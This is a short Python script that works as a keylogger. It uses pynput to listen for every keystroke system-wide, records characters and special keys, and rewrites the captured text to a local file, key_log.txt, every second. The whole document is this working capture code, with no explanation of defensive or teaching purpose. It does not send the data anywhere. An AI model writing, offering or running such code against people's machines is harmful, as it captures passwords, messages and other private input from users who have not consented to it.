from pynput import keyboard
import threading
import time

# Global variable to store the logged keys
logged_keys = []

def on_press(key):
    try:
        logged_keys.append(key.char)
    except AttributeError:
        if key == keyboard.Key.space:
            logged_keys.append(" ")
        elif key == keyboard.Key.enter:
            logged_keys.append("\n")
        else:
            logged_keys.append(str(key))

def start_key_logger():
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

def write_to_file():
    while True:
        with open("key_log.txt", "w") as file:
            file.write("".join(logged_keys))
        time.sleep(1)

# Start the key logger in a separate thread
key_logger_thread = threading.Thread(target=start_key_logger)
key_logger_thread.start()

# Start writing to file in a separate thread
file_writer_thread = threading.Thread(target=write_to_file)
file_writer_thread.start()